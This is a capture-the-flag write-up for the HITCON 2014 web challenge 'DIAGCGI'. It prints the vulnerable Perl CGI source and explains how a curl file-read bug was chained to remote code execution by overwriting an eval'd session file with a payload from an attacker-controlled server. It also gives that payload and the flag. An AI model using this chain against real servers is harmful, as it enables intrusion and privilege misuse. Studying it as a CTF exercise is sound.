# HITCON CTF 2014: DIAGCGI

**Category:** Web
**Points:** 68
**Description:**

> http://54.92.127.128:16888/

## Write-up

Entering `file:///etc/passwd` in the form and clicking the `curl` button shows us:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
key:x:1001:1001::/home/key:
```

Let’s try to turn this file disclosure vulnerability into remote command execution. The default location for `cgi-bin` on Ubuntu (gained by reading `/etc/issue`) is `/usr/lib/cgi-bin`; as such we can read `/usr/lib/cgi-bin/dana-na.cgi` and get the following:

```perl
#!/usr/bin/perl -w

use CGI;
use Digest::MD5 qw(md5_hex);

$cgi = new CGI;
$SESSDIR = "/tmp/";
$sessfile = $cgi->cookie("diagsess");
$arg0 = $cgi->param("arg");
$action = $cgi->param("action");
$arg = &safestr($arg0);

if (! defined($sessfile) )
{
	if ( md5_hex($cgi->param("sechash")) =~ /^000000000000.*$/)
	{
		$sesshash{'user'} = 'admin';
	}
	else
	{
		$sesshash{'user'}  = 'guest';
	}
	$sesshash{'ip'} = &get_ip;

	$diagsess = md5_hex( $sesshash{'user'} . '|||' . $sesshash{'ip'} );
	$cookie = "diagsess=$diagsess;";
	&write_session;
	print $cgi->header(-cookie => $cookie,
			-expires => 'Mon, 01 Jan 1999 00:00:00 GMT',
			-'cache-control' => 'no-cache',
			-pragma => 'no-cache',-'location'=> 'dana-na.cgi?sechash=' );

	exit 0;
}
else
{
	print $cgi->header();
	&read_session;
	&print_menu;
}
if (defined ($action) && length($action)>0)
{
	if ($action =~ /^print_session$/)
	{
		&print_session;
		exit 0;
	}
	if ($action =~ /^curl$/)
	{
		&curl($arg);
		exit 0;
	}
	if ($action =~ /^ping$/ )
	{
		&ping($arg);
		exit 0;
	}
	if ($action =~ /^traceroute$/)
	{
		&traceroute ($arg);
		exit 0;
	}
	if ($action =~ /^shell$/)
	{
		&shell($arg);
		exit 0;
	}

}

sub curl
{
	$host = shift;
	print "<pre><textarea rows=24 cols=80>";
	if (defined($host) && length($host)>1)
	{
		open(GG,"/usr/bin/curl -s $host |") and do
		{
			while(<GG>)
			{
				print;
			}
		}
	}
}

sub ping
{
	my $host = shift;
	print "<pre>";
	if(defined($host) && length($host)>1)
	{
		open(GG,"/bin/ping -c3 $host |") and do
		{
			while(<GG>)
			{

				print;
			}

		};
		close GG;

	}
}

sub traceroute
{
	my $host = shift;
	print "<pre>";
	if(defined($host) && length($host)>1)
	{
		open(GG,"/usr/sbin/traceroute -d -n -w 5 $host |") and do
		{
			while(<GG>)
			{
				print;
			}

		};
		close GG;
	}
}

sub read_session
{
	undef %sesshash;
	if(! -f "$SESSDIR/$sessfile")
	{
		print "session error!";
		return;
	}
	open(GG, "$SESSDIR/$sessfile") and do {
		while (<GG>) {
			eval($_);
		}
		close GG;
	};
}

sub write_session
{
	open(GG, ">$SESSDIR/$diagsess") and do
	{
		foreach (sort keys %sesshash)
		{
			print GG "\$sesshash{'$_'} = '$sesshash{$_}';\n";
		}
	};
	close GG;
}

sub print_session
{
	foreach (sort keys %sesshash) {
		print "$_=$sesshash{$_}\n";
	}
}

sub shell
{
	$cmd = shift;
	print "<pre>";
	if (  $sesshash{'user'} eq 'admin' )
	{
		open(GG, "$cmd |") and do
		{
			print;
		};
	}
	else
	{
		print "sorry $sesshash{'user'}! you're not admin!\n";

	}
}

sub print_menu
{
	$arg0 =~ s/\</\<\;/g;
	open(GG,"cat menu.html |") and do
	{
		while(<GG>)
		{
			$_ =~ s/\%\%arg\%\%/$arg0/g;
			print $_;
		}
		close GG;
	};
}

sub get_ip
{
	$h1 = $ENV{'REMOTE_ADDR'};
	$h2 = $ENV{'HTTP_CLIENT_IP'};
	$h3 = $ENV{'HTTP_X_FORWARDED_FOR'};

	if (length($h3)>0)
	{
		return $h3;
	}
	elsif (length($h2)>0)
	{
		return $h2;
	}
	else
	{
		return $h1;
	}
	return "UNKNOWN";
}

sub safestr
{
	my $str = shift;

	$str =~  s/([;<>\*\|`&\$!#\(\)\[\]\{\}:'"])/\\$1/g;;
	return $str;

}
```

The `read_session` function evaluates everything in the session file, and as we know our cookie, we can read our session file in `/tmp/<cookie>`. Additionally we know it’s possible to create/override files using `curl`’s `-o` output flag and pointing it to our session file. Using similar techniques to the full solution we can run the `ls` command on the server root and see the following:

```
total 988K
drwxr-xr-x 22 root root 4.0K Aug 13 16:29 .
drwxr-xr-x 22 root root 4.0K Aug 13 16:29 ..
drwxr-xr-x 2 root root 4.0K Jul 27 11:15 bin
drwxr-xr-x 3 root root 4.0K Jul 27 11:16 boot
drwxr-xr-x 13 root root 3.9K Aug 13 16:29 dev
drwxr-xr-x 90 root root 4.0K Aug 13 16:29 etc
drwxr-xr-x 3 root root 4.0K Jul 27 05:17 home
lrwxrwxrwx 1 root root 33 Jun 7 10:50 initrd.img -> boot/initrd.img-3.13.0-29-generic
-r-------- 1 key www-data 41 Jul 28 08:37 key.txt
drwxr-xr-x 21 root root 4.0K Jul 28 08:35 lib
drwxr-xr-x 2 root root 4.0K Aug 13 16:29 lib64
drwx------ 2 root root 16K Jun 7 10:51 lost+found
drwxr-xr-x 2 root root 4.0K Jun 7 10:49 media
drwxr-xr-x 2 root root 4.0K Apr 10 22:12 mnt
drwxr-xr-x 2 root root 4.0K Jun 7 10:49 opt
dr-xr-xr-x 155 root root 0 Aug 13 16:29 proc
-r-sr-x--- 1 key www-data 858K Jul 28 08:39 read_key
drwx------ 4 root root 4.0K Aug 16 11:37 root
drwxr-xr-x 19 root root 680 Aug 17 00:20 run
drwxr-xr-x 2 root root 12K Aug 13 16:29 sbin
drwxr-xr-x 2 root root 4.0K Jun 7 10:49 srv
dr-xr-xr-x 13 root root 0 Aug 13 16:29 sys
drwxrwxrwt 2 root root 36K Aug 17 00:33 tmp
drwxr-xr-x 10 root root 4.0K Jun 7 10:49 usr
drwxr-xr-x 13 root root 4.0K Jul 27 11:18 var
lrwxrwxrwx 1 root root 30 Jun 7 10:50 vmlinuz -> boot/vmlinuz-3.13.0-29-generic
```

`key.txt` doesn’t have read permissions for us but the `read_key` binary is `setuid` and we can assume this is how the organizers want us to read the keyfile. In most of these instances where you need to run a binary to read a file they expect the file to be read as an argument.

Leveraging these bits of information we write the following in to a webserver we control:

```perl
$sesshash{'ip'} = 'YOUR.IP.GOES.HERE';
$sesshash{'user'} = 'admin';
system("/read_key /key.txt >> /tmp/test.txt");
```

Then we simply `curl` that into our session file, reload the page to have our session read and then read `/tmp/test.txt` to get the key.

The flag is `HITCON{a755be06b165ed8fc4710d3544fce942}`.

## Other write-ups and resources

* <http://givemesecurity.info/2014/08/18/diagcgi-writeup-hitcon-2014/>
* <https://gist.github.com/connection/f90a01c09601c600a332>, related [notes](http://cuby.hu/hitcon-lol-notes-then-not-writeups.txt)
* <https://rzhou.org/~ricky/hitcon2014/diagcgi/>
